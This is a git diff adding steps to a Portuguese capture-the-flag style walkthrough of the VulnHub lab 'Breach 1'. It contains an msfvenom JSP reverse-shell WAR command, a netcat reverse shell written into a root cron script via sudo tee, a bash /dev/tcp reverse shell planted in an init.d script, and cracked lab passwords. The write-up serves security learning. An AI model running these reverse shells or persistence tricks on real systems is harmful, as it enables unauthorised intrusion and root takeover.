@@ -1,6 +1,6 @@
 ---
 title: "VulnHub - Breach 1"
-tags: [Linux, Medium, Wpscan, Gobuster, Wfuzz, Exiftool, Binwalk, FTP, Wfuzz User Agent, Wfuzz Brute Force, Crunch, Fcrackzip, Wordpress, Magic Number, Find]
+tags: [Linux, Hard, Gobuster, ImpressCMS, Java Keystore, Keytool, Pcap, SSL, Keytool Decrypt, TLS Stream, Tomcat, Msfvenom, Linpeas, Exiftool, Exif, Sudo, Tee]
 categories: VulnHub
 ---
 
@@ -177,7 +177,7 @@ Outra coisa que nos chamou muita atenção foi um /cmd que executa comandos no s
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/cmd.png)
 
-## Tomcat
+# Tomcat
 
 Então, entramos nesse site pra ver o que tem nele
 
@@ -202,3 +202,150 @@ Logamos então com as credenciais encontradas no pcap
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/site3.png)
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/site4.png)
+
+Vamos ganhar um reverse shell agora
+
+## Msfvenon
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.102 LPORT=55135 -f war > breach.war
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/msfvenom.png)
+
+Upamos o arquivo no site
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/msfvenom1.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/msfvenom2.png)
+
+# tomcat -> Milton
+
+Recebemos o Reverse Shell
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/msfvenom3.png)
+
+Pelos posts ele dizia que guardava a senha em um lugar super seguro... dando uma olhada por ai encontramos que podemos acessar o mysql como root sem senha, possivelmente é ali que ele guarda as senhas
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/db.png)
+
+Conseguimos acesso
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/db1.png)
+
+Conseguimos um hash
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/db2.png)
+
+Agora uma senha!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/db3.png)
+
+**milton:thelaststraw**
+
+Acessamos como milton
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/db4.png)
+
+# Milton -> Blumbergh
+
+Beleza, aqui tentei rodar vários scripts e tudo mais pra ver se tinha algo nele não encontrei nada... ai comecei a fuçar novamente as imagens no site
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/exif.png)
+
+Nessa imagem encontrei algo interessante nos metadados dela
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/exif1.png)
+
+Esse comentário nos chamou atenção
+
+Tentamos um su ou um ssh e vemos que conseguimos acessar como blumbergh
+
+**blumbergh:coffeestains**
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/blumb.png)
+
+# Blumbergh -> Root
+
+Agora vamos iniciar a escalação de privilégios para root
+
+## Linpeas
+
+[Linpeas](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/lin.png)
+
+Baixamos ele
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/lin1.png)
+
+Rodamos o linpeas como Blumbergh
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/linpeas3.png)
+
+Verificamos algo interessante no sudo -l
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/sudo.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/sudo1.png)
+
+Podemos usar o comando tee como root neste script...
+
+Ai ele fala que é executado a cada 3 min
+
+**#This script is set to run every 3 minutes as an additional defense measure against hackers.**
+
+Adicionamos nosso reverse shell
+
+```bash
+echo "nc 192.168.110.102 55135 -e /bin/bash" > /tmp/shell
+cat /tmp/shell
+cat /tmp/shell | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
+cat /usr/share/cleanup/tidyup.sh
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/tid.png)
+
+Agora esperamos e viramos root
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/tid2.png)
+
+Pegamos a flag de root
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/flag.png)
+
+Verificamos essa imagem **flair.jpg** mas não tem nada nela
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/flair.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/flair1.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/flair2.png)
+
+# Algo a Mais
+
+Vamos verificar mais algumas coisas pra se explorar nessa máquina
+
+## Kernel
+
+Kernel Desatualizado
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/linpeas1.png)
+
+Contudo não consegui explorar...
+
+## Script inicialização
+
+Podemos escrever em um arquivo do /etc/init.d, interessante!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/linpeas2.png)
+
+Adicionamos nosso reverse shell na máquina
+
+**/bin/bash -i >& /dev/tcp/192.168.110.102/4444 0>&1**
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/rev.png)
+
+Reiniciamos e ganhamos o shell de root
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach1/rev1.png)
